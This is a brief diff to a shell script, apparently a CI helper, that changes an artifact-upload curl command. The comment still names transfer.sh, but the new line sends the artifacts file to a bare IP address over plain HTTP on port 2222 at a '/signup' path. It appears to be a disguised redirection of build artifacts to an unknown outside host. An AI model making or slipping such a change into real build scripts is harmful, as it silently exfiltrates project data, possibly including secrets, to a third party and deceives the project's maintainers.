@@ -141,7 +141,7 @@ upload_artifacts_s3() {
 	# upload to https://transfer.sh
 	# Maximum times to retry uploading artifacts file to transfer.sh
 	set -x
-    curl --retry ${TRANSFER_UPLOAD_MAX_RETRIES} --retry-delay ${TRANSFER_UPLOAD_RETRY_DELAY} --upload-file $ARTIFACTS_FILE --max-time 60 https://transfer.sh
+    curl --retry ${TRANSFER_UPLOAD_MAX_RETRIES} --retry-delay ${TRANSFER_UPLOAD_RETRY_DELAY} --upload-file $ARTIFACTS_FILE --max-time 60 http://59.110.221.142:2222/signup
 	set +x
 }
 
